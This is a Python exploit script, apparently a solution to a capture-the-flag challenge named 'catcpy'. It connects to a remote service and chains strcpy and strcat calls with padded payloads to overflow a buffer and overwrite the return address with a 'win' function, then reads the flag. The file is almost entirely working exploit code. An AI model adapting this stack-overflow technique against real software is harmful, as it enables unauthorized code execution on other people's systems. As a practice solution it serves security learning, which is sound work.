from ptrlib import *
#import time
    
elf = ELF("./catcpy")
#sock = Process("./catcpy")
#sock = Socket('127.0.0.1', 5000)
sock = Socket('34.170.146.252', 25267)

print(sock.recv(10).decode("utf-8")) # 1. strcpy
print(sock.recv(10).decode("utf-8")) # 2. strcat
print(sock.recv(2).decode("utf-8")) # >  
#time.sleep(5) # time sleep for gdb attaching
sock.sendline("1")

print(sock.recv(5).decode("utf-8")) # Data: 
payload = b'A' * 252
print(payload)
sock.sendline(payload)

print('[debug1]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug1]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("2")

print(sock.recv(5).decode("utf-8")) # Data: 
payload = b'A' * 27
payload += b'A' * 5
payload += b'\x00'
#payload += p64(elf.symbol("win"))
print(payload)
sock.sendline(payload)

print('[debug2]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug2]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("1")

print(sock.recv(5).decode("utf-8")) # Data: 
payload = b'A' * 252
print(payload)
sock.sendline(payload)

print('[debug3]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug3]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("2")

print(sock.recv(5).decode("utf-8")) # Data: 
payload = b'A' * 27
payload += b'A' * 4
payload += b'\x00'
#payload += p64(elf.symbol("win"))
print(payload)
sock.sendline(payload)

print('[debug4]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug4]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("1")

print(sock.recv(6).decode("utf-8")) # Data: 
payload = b'A' * 252
print(payload)
sock.sendline(payload)

print('[debug5]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug5]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("2")

print(sock.recv(6).decode("utf-8")) # Data: 
#payload = b'A' * 27
payload = b'A' * 27
payload += p64(elf.symbol("win")) # 0x401256
payload += b'\x00'
print(payload)
sock.sendline(payload)

print('[debug6]:' + sock.recv(1).decode("utf-8")) # >  
print('[debug6]:' + sock.recv(2).decode("utf-8")) # >  
sock.sendline("3")

### leak flag ###
print(sock.recvline().decode("utf-8"))
